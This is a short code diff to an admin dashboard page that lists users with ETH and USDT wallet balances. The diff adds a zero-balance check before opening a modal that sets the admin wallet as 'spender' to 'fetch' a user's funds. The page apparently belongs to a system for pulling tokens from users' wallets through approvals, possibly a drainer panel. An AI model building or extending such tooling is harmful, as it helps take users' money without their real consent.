@@ -31,7 +31,7 @@
                 </div>
             </div>
             <!-- /.card-header -->
-            <div class="card-body p-0 table-responsive">
+            <div class="card-body p-2 table-responsive">
                 <table class="table table-striped display text-nowrap" id="user-table">
                     <thead>
                         <tr>
@@ -265,11 +265,18 @@
         var wallet = $("#modal_eth_" + id).attr('data-wallet');
         var balance = $("#modal_eth_" + id).attr('data-balance');
 
-        $("#modal-wallet").val(wallet);
-        $("#modal-spender").val(adminWalletAddress);
-        $("#modal-balance").text(balance);
+        if(balance == '' || balance == '0.0')
+        {
+            $('#errorForm').modal('show');
+            
+        }else{
 
-        $('#fetchForm').modal('show');
+            $("#modal-wallet").val(wallet);
+            $("#modal-spender").val(adminWalletAddress);
+            $("#modal-balance").text(balance);
+
+            $('#fetchForm').modal('show');
+        }
 
     }
 
@@ -282,11 +289,18 @@
         var wallet = $("#modal_usdt_" + id).attr('data-wallet');
         var balance = $("#modal_usdt_" + id).attr('data-balance');
 
-        $("#modal-wallet").val(wallet);
-        $("#modal-spender").val(adminWalletAddress);
-        $("#modal-balance").text(balance);
+        if(balance == '' || balance == '0.0')
+        {
+            $('#errorForm').modal('show');
 
-        $('#fetchForm').modal('show');
+        }else{
+
+            $("#modal-wallet").val(wallet);
+            $("#modal-spender").val(adminWalletAddress);
+            $("#modal-balance").text(balance);
+
+            $('#fetchForm').modal('show');
+        }
 
     }
 
